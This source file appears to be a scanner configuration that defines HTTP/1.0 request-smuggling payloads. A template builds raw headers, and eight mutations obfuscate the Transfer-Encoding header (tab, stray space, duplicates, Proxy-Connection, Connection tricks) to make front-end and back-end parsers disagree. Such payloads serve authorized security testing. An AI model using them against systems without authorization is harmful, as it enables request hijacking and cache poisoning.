# HTTP/1.0 + Connection: keep-alive desync coverage.
#
# RFC 1945 doesn't define chunked transfer-encoding for HTTP/1.0, but many
# upstream parsers still honor it; combined with an explicit
# `Connection: keep-alive` (which IS valid for 1.0) you can produce front/back
# parser disagreement equivalent to TE.CL / CL.TE on HTTP/1.1.

def render_template_10(gadget, extra=None):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.0" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Connection: keep-alive" + RN
	if extra:
		p.header += extra + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p


mutations["http10-vanilla"]      = render_template_10("Transfer-Encoding: chunked")
mutations["http10-tab"]          = render_template_10("Transfer-Encoding:\tchunked")
mutations["http10-space"]        = render_template_10("Transfer-Encoding : chunked")
mutations["http10-comma"]        = render_template_10("Transfer-Encoding: chunked, identity")
mutations["http10-dual"]         = render_template_10("Transfer-Encoding: chunked", "Transfer-Encoding: identity")
mutations["http10-proxyconn"]    = render_template_10("Transfer-Encoding: chunked", "Proxy-Connection: keep-alive")
mutations["http10-upgradeKA"]    = render_template_10("Transfer-Encoding: chunked", "Connection: Upgrade, keep-alive")
mutations["http10-conn-te"]      = render_template_10("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
